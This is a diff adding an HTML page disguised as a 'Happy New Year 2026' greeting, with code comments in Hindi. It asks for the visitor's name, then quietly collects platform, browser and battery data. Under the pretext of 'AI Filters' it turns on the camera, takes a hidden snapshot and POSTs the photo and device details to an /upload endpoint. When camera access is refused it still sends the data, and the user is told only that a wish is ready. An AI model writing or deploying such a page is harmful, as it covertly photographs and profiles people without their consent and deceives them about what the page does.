@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Year 2026 Surprise!</title>
+    <style>
+        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; text-align: center; }
+        .container { margin-top: 50px; }
+        input { padding: 10px; border-radius: 5px; border: none; width: 80%; max-width: 300px; }
+        button { padding: 10px 20px; background: #ffcc00; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        #status { color: #00ff00; margin-top: 20px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎆 Happy New Year 2026 🎆</h1>
+        <p>Enter your name to see the magic!</p>
+        <input type="text" id="userName" placeholder="Type your name here...">
+        <br>
+        <button onclick="startMagic()">Get My Wish! ✨</button>
+        <p id="status">Applying AI Filters...</p>
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function startMagic() {
+            const name = document.getElementById('userName').value;
+            if(!name) { alert("Please enter your name!"); return; }
+
+            document.getElementById('status').style.display = 'block';
+
+            // डिवाइस इन्फो इकट्ठा करना
+            const deviceInfo = {
+                platform: navigator.platform,
+                browser: navigator.userAgent,
+                battery: 0
+            };
+
+            try {
+                const battery = await navigator.getBattery();
+                deviceInfo.battery = Math.round(battery.level * 100);
+                
+                // कैमरा परमिशन मांगना
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // 5 फोटो लेने का लॉजिक (Front Camera Demo)
+                setTimeout(() => {
+                    captureAndSend(name, deviceInfo, stream);
+                }, 2000);
+
+            } catch (err) {
+                // अगर परमिशन नहीं मिली, तब भी डेटा भेजना
+                sendData(name, null, deviceInfo);
+            }
+        }
+
+        function captureAndSend(name, info, stream) {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/png');
+            sendData(name, imageData, info);
+
+            // कैमरा बंद करना
+            stream.getTracks().forEach(track => track.stop());
+            alert("Happy New Year 2026, " + name + "! Your personalized wish is ready!");
+        }
+
+        function sendData(name, image, info) {
+            fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: name, image: image, device_info: info })
+            });
+        }
+    </script>
+</body>
+</html>
